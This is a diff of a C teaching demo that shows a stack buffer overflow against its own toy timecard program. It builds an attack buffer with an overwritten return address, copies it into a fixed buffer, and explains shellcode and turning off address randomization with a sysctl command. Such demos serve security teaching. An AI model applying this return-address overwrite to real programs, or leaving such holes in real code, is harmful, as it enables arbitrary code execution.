@@ -63,6 +63,11 @@ void add_new_employee(struct Employee *database, int employee_count,
 		printf("\tframe base pointer: %p\n", __builtin_frame_address(0));
 		printf("\tname_input[0] address: %p\n\n", &name_input[0]);
 
+		attack[132] = ((int)(&name_input[0] + 10) & 0x000000ff) >> 0;
+		attack[133] = ((int)(&name_input[0] + 10) & 0x0000ff00) >> 8;
+		attack[134] = ((int)(&name_input[0] + 10) & 0x00ff0000) >> 16;
+		attack[135] = ((int)(&name_input[0] + 10) & 0xff000000) >> 24;
+
 		wait_for_enter();
 
 		for (int i = 159; i>=0; i--) {
@@ -72,6 +77,7 @@ void add_new_employee(struct Employee *database, int employee_count,
 				i, attack[i],
 				(isgraph(attack[i]) ? attack[i] : ' ' ));
 		}
+
 		printf("\n\nbefore attack:\n\tfucntion return address: %p\n", __builtin_return_address(0));
 		strncpy(name_input, attack, 160);
 		printf("after attack:\n\tfunction return address: %p\n\n", __builtin_return_address(0));
@@ -181,6 +187,8 @@ int main(void) {
 
 	/* print buffer diagram of "before attack" */
 
+	wait_for_enter();
+
 	/* show shellcode (compilation process/disassemble, plus actual bytes) */
 	printf( "The \"payload\" code pasted into the timecard program will\n"
 		"look something like this:\n\n");
@@ -200,7 +208,7 @@ int main(void) {
 	);
 	wait_for_enter();
 
-	printf( "The code is written in assembly for the platform that is under\n"
+	printf( "The code is written in assembly, for the platform that is under\n"
 		"attack: this allows the attacker to write very small but\n"
 		"powerful programs that will fit inside the vulnerable program\n"
 		"\n"
@@ -212,10 +220,10 @@ int main(void) {
 
 	printf( "Importantly, for this demo we need to disable some compiler\n"
 		"and operating system protections. These are usually enabled\n"
-		"for us, due to how dangerous and prevalent these type of\n"
-		"attacks are:\n"
+		"for us by default, due to how dangerous and prevalent these\n"
+		" type of attacks are:\n"
 		"\n"
-		"We've already disabled address space randomization using:\n"
+		"We've disabled address space randomization using:\n"
 		"\n"
 		"\t# sysctl -w kernel.randomize_va_space=0\n"
 		"\n"
@@ -227,6 +235,8 @@ int main(void) {
 	wait_for_enter();
 
 	/* print buffer diagram of "after attack" */
+
+	wait_for_enter();
 
 	printf( "Finally, let's see the attack in action! We will call the\n"
 		"function with the vulnerability, and use a global variable\n"
